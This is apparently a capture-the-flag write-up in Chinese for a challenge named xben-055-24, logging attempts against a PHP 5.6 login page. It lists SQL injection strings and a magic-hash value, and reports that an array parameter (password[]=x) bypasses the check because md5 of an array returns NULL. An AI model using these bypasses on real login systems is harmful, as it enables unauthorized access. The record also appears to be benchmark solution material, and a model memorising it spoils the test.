# xben-055-24 · 探索记录

对应题解：[`xben-055-24.md`](./xben-055-24.md)

## 目标与起点

`10.0.172.218:80`，PHP 5.6.40，AUTH 05 登录页（username/password，GET）。

## 第一阶段：常规尝试

| 输入 | 结果 |
| --- | --- |
| `admin/admin`、`admin/password` | 同一张登录页 |
| `admin'-- -`、`' OR 1=1-- -` | 同一张登录页 |
| `password=240610708` | 同一张登录页 |

## 第二阶段：数组参数

| 输入 | 结果 |
| --- | --- |
| `password[]=x` | **flag** |

## 这次真正的收获

PHP 里 `md5(array)` 返回 NULL；只要后端用 `==`/`strcmp` 判等，数组参数就能绕过。
